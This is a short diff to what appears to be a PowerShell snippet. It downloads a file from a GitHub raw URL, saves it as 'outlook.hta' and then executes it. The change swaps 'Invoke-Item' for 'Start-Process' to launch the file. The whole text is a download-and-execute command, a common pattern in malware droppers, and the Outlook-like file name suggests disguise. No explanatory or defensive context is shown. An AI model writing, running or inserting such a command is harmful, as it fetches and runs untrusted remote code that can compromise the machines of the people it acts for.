@@ -1,2 +1,2 @@
 (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/CYBER4CE/ST/master/outlook.txt', 'outlook.hta'); 
-Invoke-Item outlook.hta;
+Start-Process .\outlook.hta;
